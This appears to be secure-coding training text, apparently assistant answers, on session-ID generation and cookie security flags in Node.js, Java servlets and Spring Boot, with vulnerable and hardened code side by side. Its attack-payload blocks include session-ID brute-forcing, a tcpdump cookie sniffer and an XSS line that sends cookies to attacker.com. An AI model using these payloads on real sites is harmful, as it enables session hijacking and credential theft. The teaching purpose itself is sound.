Your session ID generation is likely vulnerable if it uses predictable values. Let me show you why this is critical and how to fix it.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// DANGEROUS: Predictable session ID generation
let sessionCounter = 1000;
const sessions = new Map();

function generateSessionId(userId) {
  // Predictable: sequential counter + timestamp
  const timestamp = Date.now();
  const sessionId = `sess_${userId}_${sessionCounter++}_${timestamp}`;
  return sessionId;
}

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Assume authentication succeeds
  const userId = authenticateUser(username, password);

  if (userId) {
    const sessionId = generateSessionId(userId);
    sessions.set(sessionId, {
      userId: userId,
      createdAt: Date.now(),
      username: username
    });

    res.cookie('sessionId', sessionId);
    res.json({ success: true, message: 'Logged in' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/dashboard', (req, res) => {
  const sessionId = req.cookies.sessionId;
  const session = sessions.get(sessionId);

  if (session) {
    res.json({ user: session.username, data: 'sensitive information' });
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
});
```

**Attack Payload**:
```text
# Attacker observes their own session ID:
sess_42_1001_1704825600000

# Attacker predicts other valid session IDs:
sess_1_1000_1704825599000    # Admin user (ID 1), previous counter
sess_43_1002_1704825601000   # Next user who logs in

# Brute force script to enumerate sessions:
for counter in range(900, 1100):
    for user_id in range(1, 100):
        session_id = f"sess_{user_id}_{counter}_{estimated_timestamp}"
        # Try hijacking session
```

**Why This Is Dangerous**:
- Sequential counters allow attackers to enumerate all possible session IDs
- User IDs in session tokens reveal internal identifiers
- Timestamps can be estimated within milliseconds of server time
- No cryptographic randomness means session space is trivially small
- Attacker can hijack any user session including administrators

**SECURE VERSION**:

```javascript
const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
app.use(express.json());
app.use(cookieParser());

const sessions = new Map();
const SESSION_EXPIRY_MS = 30 * 60 * 1000; // 30 minutes

// SECURE: Cryptographically random session ID generation
function generateSecureSessionId() {
  // 32 bytes = 256 bits of entropy, output as 64 hex characters
  return crypto.randomBytes(32).toString('hex');
}

function createSession(userId, username) {
  const sessionId = generateSecureSessionId();
  const now = Date.now();

  sessions.set(sessionId, {
    userId: userId,
    username: username,
    createdAt: now,
    expiresAt: now + SESSION_EXPIRY_MS,
    lastActivity: now
  });

  return sessionId;
}

function validateSession(sessionId) {
  if (!sessionId || typeof sessionId !== 'string') {
    return null;
  }

  // Validate format: must be 64 hex characters
  if (!/^[a-f0-9]{64}$/.test(sessionId)) {
    return null;
  }

  const session = sessions.get(sessionId);

  if (!session) {
    return null;
  }

  // Check expiration
  if (Date.now() > session.expiresAt) {
    sessions.delete(sessionId);
    return null;
  }

  // Update last activity (sliding expiration)
  session.lastActivity = Date.now();
  session.expiresAt = Date.now() + SESSION_EXPIRY_MS;

  return session;
}

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const userId = authenticateUser(username, password);

  if (userId) {
    const sessionId = createSession(userId, username);

    // Secure cookie settings
    res.cookie('sessionId', sessionId, {
      httpOnly: true,     // Prevent XSS access
      secure: true,       // HTTPS only
      sameSite: 'strict', // CSRF protection
      maxAge: SESSION_EXPIRY_MS
    });

    console.log(`[AUTH] User ${username} logged in from ${req.ip}`);
    res.json({ success: true, message: 'Logged in' });
  } else {
    console.log(`[AUTH] Failed login attempt for ${username} from ${req.ip}`);
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/dashboard', (req, res) => {
  const session = validateSession(req.cookies.sessionId);

  if (session) {
    res.json({ user: session.username, data: 'sensitive information' });
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
});
```

**Key Security Controls**:
- **Cryptographic randomness**: `crypto.randomBytes(32)` provides 256 bits of entropy, making brute force infeasible (2^256 possibilities)
- **No user data in session ID**: Session ID reveals nothing about the user or system state
- **Session expiration**: Automatic expiration limits the window for session hijacking
- **Secure cookie flags**: `httpOnly`, `secure`, and `sameSite` prevent various session theft vectors
- **Input validation**: Session ID format is validated before database lookup

Excellent questions! Session fixation and distributed session management are critical for production systems. Here's a comprehensive solution.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const Redis = require('ioredis');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());
app.use(cookieParser());

// Redis cluster for distributed session storage
const redis = new Redis.Cluster([
  { host: process.env.REDIS_HOST_1, port: 6379 },
  { host: process.env.REDIS_HOST_2, port: 6379 },
  { host: process.env.REDIS_HOST_3, port: 6379 }
], {
  redisOptions: {
    password: process.env.REDIS_PASSWORD,
    tls: process.env.NODE_ENV === 'production' ? {} : undefined
  }
});

// Configuration
const SESSION_CONFIG = {
  SESSION_TTL_SECONDS: 1800,           // 30 minutes
  ABSOLUTE_TIMEOUT_SECONDS: 28800,     // 8 hours absolute max
  SESSION_ID_BYTES: 32,                // 256 bits entropy
  MAX_SESSIONS_PER_USER: 5,            // Limit concurrent sessions
  ROTATION_INTERVAL_MS: 300000         // Rotate every 5 minutes
};

// Rate limiting for login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts per window
  message: { error: 'Too many login attempts, please try again later' },
  standardHeaders: true,
  legacyHeaders: false
});

// SECURE: Cryptographically random session ID
function generateSecureSessionId() {
  return crypto.randomBytes(SESSION_CONFIG.SESSION_ID_BYTES).toString('base64url');
}

// SECURE: HMAC-based session binding token
function generateSessionBindingToken(sessionId, userAgent, ip) {
  const data = `${sessionId}:${userAgent}:${ip}`;
  return crypto
    .createHmac('sha256', process.env.SESSION_SECRET)
    .update(data)
    .digest('hex');
}

class SecureSessionManager {
  constructor(redisClient) {
    this.redis = redisClient;
  }

  // Create new session with anti-fixation measures
  async createSession(userId, username, req) {
    const sessionId = generateSecureSessionId();
    const now = Date.now();

    // Binding token prevents session from being used on different client
    const bindingToken = generateSessionBindingToken(
      sessionId,
      req.get('user-agent') || '',
      req.ip
    );

    const sessionData = {
      userId,
      username,
      createdAt: now,
      lastActivity: now,
      absoluteExpiry: now + (SESSION_CONFIG.ABSOLUTE_TIMEOUT_SECONDS * 1000),
      lastRotation: now,
      bindingToken,
      userAgent: req.get('user-agent') || 'unknown',
      ipAddress: req.ip,
      rotationCount: 0
    };

    // Store session in Redis with TTL
    const sessionKey = `session:${sessionId}`;
    await this.redis.setex(
      sessionKey,
      SESSION_CONFIG.SESSION_TTL_SECONDS,
      JSON.stringify(sessionData)
    );

    // Track user's sessions for limiting concurrent sessions
    const userSessionsKey = `user_sessions:${userId}`;
    await this.redis.zadd(userSessionsKey, now, sessionId);

    // Enforce max concurrent sessions
    await this.enforceMaxSessions(userId);

    // Audit log
    await this.auditLog('SESSION_CREATED', {
      userId,
      username,
      sessionId: sessionId.substring(0, 8) + '...',
      ip: req.ip,
      userAgent: req.get('user-agent')
    });

    return sessionId;
  }

  // Validate session with binding verification
  async validateSession(sessionId, req) {
    if (!sessionId || typeof sessionId !== 'string') {
      return null;
    }

    // Validate session ID format (base64url, 43 chars for 32 bytes)
    if (!/^[A-Za-z0-9_-]{43}$/.test(sessionId)) {
      return null;
    }

    const sessionKey = `session:${sessionId}`;
    const sessionJson = await this.redis.get(sessionKey);

    if (!sessionJson) {
      return null;
    }

    let session;
    try {
      session = JSON.parse(sessionJson);
    } catch (e) {
      await this.redis.del(sessionKey);
      return null;
    }

    const now = Date.now();

    // Check absolute timeout (prevents indefinite session extension)
    if (now > session.absoluteExpiry) {
      await this.destroySession(sessionId, session.userId, 'ABSOLUTE_TIMEOUT');
      return null;
    }

    // Verify session binding (detects session hijacking)
    const expectedBinding = generateSessionBindingToken(
      sessionId,
      req.get('user-agent') || '',
      req.ip
    );

    if (!crypto.timingSafeEqual(
      Buffer.from(session.bindingToken),
      Buffer.from(expectedBinding)
    )) {
      await this.auditLog('SESSION_BINDING_MISMATCH', {
        sessionId: sessionId.substring(0, 8) + '...',
        expectedIp: session.ipAddress,
        actualIp: req.ip,
        userId: session.userId
      });

      // Suspicious activity - destroy session
      await this.destroySession(sessionId, session.userId, 'BINDING_MISMATCH');
      return null;
    }

    // Update last activity and refresh TTL (sliding window)
    session.lastActivity = now;
    await this.redis.setex(
      sessionKey,
      SESSION_CONFIG.SESSION_TTL_SECONDS,
      JSON.stringify(session)
    );

    // Check if session needs rotation
    if (now - session.lastRotation > SESSION_CONFIG.ROTATION_INTERVAL_MS) {
      return { session, needsRotation: true, oldSessionId: sessionId };
    }

    return { session, needsRotation: false };
  }

  // ANTI-FIXATION: Rotate session ID while preserving session data
  async rotateSession(oldSessionId, session, req) {
    const newSessionId = generateSecureSessionId();
    const now = Date.now();

    // Update binding token for new session
    const newBindingToken = generateSessionBindingToken(
      newSessionId,
      req.get('user-agent') || '',
      req.ip
    );

    const rotatedSession = {
      ...session,
      lastRotation: now,
      bindingToken: newBindingToken,
      rotationCount: (session.rotationCount || 0) + 1
    };

    // Create new session
    const newSessionKey = `session:${newSessionId}`;
    await this.redis.setex(
      newSessionKey,
      SESSION_CONFIG.SESSION_TTL_SECONDS,
      JSON.stringify(rotatedSession)
    );

    // Update user sessions tracking
    const userSessionsKey = `user_sessions:${session.userId}`;
    await this.redis.zrem(userSessionsKey, oldSessionId);
    await this.redis.zadd(userSessionsKey, now, newSessionId);

    // Keep old session valid briefly for in-flight requests
    await this.redis.setex(`session:${oldSessionId}`, 30, JSON.stringify({
      ...session,
      rotatedTo: newSessionId
    }));

    await this.auditLog('SESSION_ROTATED', {
      userId: session.userId,
      rotationCount: rotatedSession.rotationCount
    });

    return newSessionId;
  }

  // Enforce maximum concurrent sessions per user
  async enforceMaxSessions(userId) {
    const userSessionsKey = `user_sessions:${userId}`;
    const sessions = await this.redis.zrange(userSessionsKey, 0, -1);

    if (sessions.length > SESSION_CONFIG.MAX_SESSIONS_PER_USER) {
      // Remove oldest sessions
      const toRemove = sessions.slice(
        0,
        sessions.length - SESSION_CONFIG.MAX_SESSIONS_PER_USER
      );

      for (const oldSessionId of toRemove) {
        await this.destroySession(oldSessionId, userId, 'MAX_SESSIONS_EXCEEDED');
      }
    }
  }

  // Secure session destruction
  async destroySession(sessionId, userId, reason) {
    await this.redis.del(`session:${sessionId}`);
    await this.redis.zrem(`user_sessions:${userId}`, sessionId);

    await this.auditLog('SESSION_DESTROYED', {
      sessionId: sessionId.substring(0, 8) + '...',
      userId,
      reason
    });
  }

  // Destroy all sessions for a user (password change, compromise detection)
  async destroyAllUserSessions(userId, reason) {
    const userSessionsKey = `user_sessions:${userId}`;
    const sessions = await this.redis.zrange(userSessionsKey, 0, -1);

    for (const sessionId of sessions) {
      await this.redis.del(`session:${sessionId}`);
    }
    await this.redis.del(userSessionsKey);

    await this.auditLog('ALL_SESSIONS_DESTROYED', {
      userId,
      sessionCount: sessions.length,
      reason
    });
  }

  async auditLog(event, data) {
    const logEntry = {
      timestamp: new Date().toISOString(),
      event,
      ...data
    };

    // Push to audit log stream
    await this.redis.xadd(
      'audit:sessions',
      'MAXLEN', '~', '100000',
      '*',
      'data', JSON.stringify(logEntry)
    );

    console.log(`[AUDIT] ${event}:`, JSON.stringify(data));
  }
}

const sessionManager = new SecureSessionManager(redis);

// Middleware for session validation
async function requireAuth(req, res, next) {
  const sessionId = req.cookies.sessionId;

  const result = await sessionManager.validateSession(sessionId, req);

  if (!result) {
    res.clearCookie('sessionId');
    return res.status(401).json({ error: 'Authentication required' });
  }

  req.session = result.session;

  // Handle session rotation transparently
  if (result.needsRotation) {
    const newSessionId = await sessionManager.rotateSession(
      result.oldSessionId,
      result.session,
      req
    );

    res.cookie('sessionId', newSessionId, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: SESSION_CONFIG.SESSION_TTL_SECONDS * 1000
    });
  }

  next();
}

// Login endpoint with session fixation prevention
app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;

  // IMPORTANT: Destroy any existing session before creating new one
  // This prevents session fixation attacks
  const existingSessionId = req.cookies.sessionId;
  if (existingSessionId) {
    const existingSession = await sessionManager.validateSession(existingSessionId, req);
    if (existingSession) {
      await sessionManager.destroySession(
        existingSessionId,
        existingSession.session.userId,
        'NEW_LOGIN'
      );
    }
    res.clearCookie('sessionId');
  }

  const userId = await authenticateUser(username, password);

  if (userId) {
    const sessionId = await sessionManager.createSession(userId, username, req);

    res.cookie('sessionId', sessionId, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: SESSION_CONFIG.SESSION_TTL_SECONDS * 1000,
      path: '/'
    });

    res.json({ success: true, message: 'Logged in successfully' });
  } else {
    // Use constant-time response to prevent timing attacks
    await new Promise(resolve => setTimeout(resolve, 100));
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/api/logout', requireAuth, async (req, res) => {
  const sessionId = req.cookies.sessionId;
  await sessionManager.destroySession(sessionId, req.session.userId, 'USER_LOGOUT');

  res.clearCookie('sessionId');
  res.json({ success: true, message: 'Logged out successfully' });
});

app.get('/api/dashboard', requireAuth, (req, res) => {
  res.json({
    user: req.session.username,
    sessionInfo: {
      createdAt: new Date(req.session.createdAt).toISOString(),
      expiresIn: Math.floor((req.session.absoluteExpiry - Date.now()) / 1000)
    }
  });
});

// Password change requires destroying all other sessions
app.post('/api/change-password', requireAuth, async (req, res) => {
  const { currentPassword, newPassword } = req.body;

  // Verify current password and update...
  const success = await updatePassword(req.session.userId, currentPassword, newPassword);

  if (success) {
    // Destroy all sessions except current
    await sessionManager.destroyAllUserSessions(
      req.session.userId,
      'PASSWORD_CHANGED'
    );

    // Create new session
    const newSessionId = await sessionManager.createSession(
      req.session.userId,
      req.session.username,
      req
    );

    res.cookie('sessionId', newSessionId, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: SESSION_CONFIG.SESSION_TTL_SECONDS * 1000
    });

    res.json({ success: true, message: 'Password changed, all other sessions terminated' });
  } else {
    res.status(400).json({ error: 'Invalid current password' });
  }
});

app.listen(3000, () => {
  console.log('Secure session server running on port 3000');
});
```

**Defense in Depth Layers**:

1. **Cryptographic Session IDs**: 256-bit random values make brute force impossible
```javascript
function generateSecureSessionId() {
  return crypto.randomBytes(32).toString('base64url');
}
```

2. **Session Binding**: Ties session to client fingerprint, detects hijacking
```javascript
const bindingToken = generateSessionBindingToken(sessionId, userAgent, ip);
// Verified on every request with timing-safe comparison
```

3. **Automatic Session Rotation**: Prevents fixation and limits exposure window
```javascript
if (now - session.lastRotation > ROTATION_INTERVAL_MS) {
  return { session, needsRotation: true };
}
```

4. **Absolute Timeout**: Prevents indefinite session extension attacks
```javascript
if (now > session.absoluteExpiry) {
  await this.destroySession(sessionId, session.userId, 'ABSOLUTE_TIMEOUT');
}
```

**Additional Protections**:
- **Rate limiting**: Prevents credential stuffing and session enumeration
- **Concurrent session limits**: Maximum 5 sessions per user prevents mass compromise
- **Redis cluster**: Horizontal scaling with automatic failover
- **Comprehensive audit logging**: All session events logged for forensics
- **Password change invalidation**: All sessions terminated on password change
- **Grace period on rotation**: Old session valid for 30 seconds for in-flight requests
- **Constant-time comparisons**: Prevents timing attacks on session validation

Using `addCookie()` without proper security flags is a critical vulnerability that exposes your users to session hijacking attacks. This was exploited in the 2023 GoAnywhere MFT breach affecting 130+ organizations.

**VULNERABLE CODE**:

```java
import javax.servlet.http.*;
import java.io.IOException;

public class LoginServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String username = request.getParameter("username");
        String password = request.getParameter("password");

        if (authenticateUser(username, password)) {
            // VULNERABLE: Creating session cookie without security flags
            String sessionId = generateSessionId();

            Cookie sessionCookie = new Cookie("SESSIONID", sessionId);
            sessionCookie.setMaxAge(3600); // 1 hour
            sessionCookie.setPath("/");
            // Missing: setSecure(true)
            // Missing: setHttpOnly(true)

            response.addCookie(sessionCookie);
            response.sendRedirect("/dashboard");
        } else {
            response.sendRedirect("/login?error=invalid");
        }
    }

    private boolean authenticateUser(String username, String password) {
        // Authentication logic
        return true;
    }

    private String generateSessionId() {
        return java.util.UUID.randomUUID().toString();
    }
}
```

**Attack Payload** (XSS stealing cookies without HttpOnly):
```html
<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>
```

**Attack Payload** (MITM capturing cookies without Secure flag):
```bash
# Using tcpdump on same network
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i cookie
```

**Why This Is Dangerous**:
- Without `HttpOnly`: JavaScript can read cookies, enabling XSS-based session theft
- Without `Secure`: Cookies transmitted over HTTP can be intercepted via MITM attacks
- Without `SameSite`: Cookies sent with cross-site requests enable CSRF attacks
- Attackers gain full session access, bypassing authentication entirely

**SECURE VERSION**:

```java
import javax.servlet.http.*;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.logging.Logger;

public class SecureLoginServlet extends HttpServlet {

    private static final Logger logger = Logger.getLogger(SecureLoginServlet.class.getName());
    private static final SecureRandom secureRandom = new SecureRandom();

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String username = request.getParameter("username");
        String password = request.getParameter("password");

        if (authenticateUser(username, password)) {
            String sessionId = generateSecureSessionId();

            // SECURE: Cookie with all security flags
            Cookie sessionCookie = new Cookie("SESSIONID", sessionId);
            sessionCookie.setMaxAge(3600);
            sessionCookie.setPath("/");
            sessionCookie.setSecure(true);    // Only transmitted over HTTPS
            sessionCookie.setHttpOnly(true);  // Not accessible via JavaScript

            // For Servlet 4.0+ (Java EE 8+), also set SameSite
            // Using response header as Cookie API doesn't support SameSite directly
            response.setHeader("Set-Cookie", 
                String.format("SESSIONID=%s; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Strict", 
                    sessionId));

            logger.info(String.format("Successful login for user: %s from IP: %s", 
                username, request.getRemoteAddr()));

            response.sendRedirect("/dashboard");
        } else {
            logger.warning(String.format("Failed login attempt for user: %s from IP: %s", 
                username, request.getRemoteAddr()));
            response.sendRedirect("/login?error=invalid");
        }
    }

    private String generateSecureSessionId() {
        byte[] bytes = new byte[32];
        secureRandom.nextBytes(bytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }

    private boolean authenticateUser(String username, String password) {
        // Secure authentication logic
        return true;
    }
}
```

**Key Security Controls**:
- `setSecure(true)`: Cookie only sent over HTTPS, preventing MITM interception
- `setHttpOnly(true)`: Cookie inaccessible to JavaScript, blocking XSS-based theft
- `SameSite=Strict`: Cookie not sent with cross-site requests, preventing CSRF
- `SecureRandom`: Cryptographically secure session ID generation

Spring Boot requires both application-level configuration and security-specific settings. Here's a production-ready implementation with multiple cookie types and defense in depth.

**PRODUCTION PATTERN**:

```java
package com.example.security.config;

import org.springframework.boot.web.servlet.server.CookieSameSiteSupplier;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.rememberme.PersistentTokenRepository;
import org.springframework.security.web.authentication.rememberme.JdbcTokenRepositoryImpl;
import org.springframework.session.web.http.CookieSerializer;
import org.springframework.session.web.http.DefaultCookieSerializer;
import javax.sql.DataSource;

@Configuration
@EnableWebSecurity
public class SecureCookieConfiguration {

    private final DataSource dataSource;

    public SecureCookieConfiguration(DataSource dataSource) {
        this.dataSource = dataSource;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .maximumSessions(1)
                .maxSessionsPreventsLogin(true)
                .expiredUrl("/login?expired")
            )
            .rememberMe(remember -> remember
                .tokenRepository(persistentTokenRepository())
                .tokenValiditySeconds(604800) // 7 days
                .key(System.getenv("REMEMBER_ME_KEY"))
                .rememberMeCookieName("REMEMBER_TOKEN")
                .useSecureCookie(true)
            )
            .logout(logout -> logout
                .deleteCookies("JSESSIONID", "REMEMBER_TOKEN")
                .invalidateHttpSession(true)
                .clearAuthentication(true)
            )
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );

        return http.build();
    }

    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSIONID");
        serializer.setCookiePath("/");
        serializer.setDomainNamePattern("^.+?\\.(\\w+\\.[a-z]+)$");
        serializer.setUseSecureCookie(true);
        serializer.setUseHttpOnlyCookie(true);
        serializer.setSameSite("Strict");
        serializer.setCookieMaxAge(3600);
        return serializer;
    }

    @Bean
    public CookieSameSiteSupplier applicationCookieSameSiteSupplier() {
        return CookieSameSiteSupplier.ofStrict();
    }

    @Bean
    public PersistentTokenRepository persistentTokenRepository() {
        JdbcTokenRepositoryImpl tokenRepository = new JdbcTokenRepositoryImpl();
        tokenRepository.setDataSource(dataSource);
        return tokenRepository;
    }
}
```

```yaml
# application-production.yml
server:
